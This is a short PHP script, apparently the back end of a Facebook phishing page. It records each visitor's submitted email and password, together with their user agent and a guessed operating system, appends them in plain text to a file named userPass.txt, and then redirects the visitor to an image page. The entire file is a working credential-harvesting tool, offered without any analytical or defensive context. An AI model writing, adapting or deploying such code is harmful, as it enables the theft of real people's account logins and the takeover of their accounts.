<?php 
// Capture user agent and operating system
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Detect the user's operating system
$os = "Unknown OS";
if (preg_match('/linux/i', $userAgent)) {
    $os = "Linux";
} elseif (preg_match('/macintosh|mac os x/i', $userAgent)) {
    $os = "Mac OS";
} elseif (preg_match('/windows|win32/i', $userAgent)) {
    $os = "Windows";
} elseif (preg_match('/android/i', $userAgent)) {
    $os = "Android";
} elseif (preg_match('/iphone/i', $userAgent)) {
    $os = "iOS";
}

// Log the data (email, password, user agent, and OS) to the file
file_put_contents("userPass.txt", "  [~] username de Facebook: " . $_POST['email'] . "\n  [~] Password: " . $_POST['pass'] . "\n  [~] User Agent: " . $userAgent . "\n  [~] oprating system: " . $os . "\n", FILE_APPEND);

// Redirect to ima.html
header('Location: ima.html');
exit();
?>
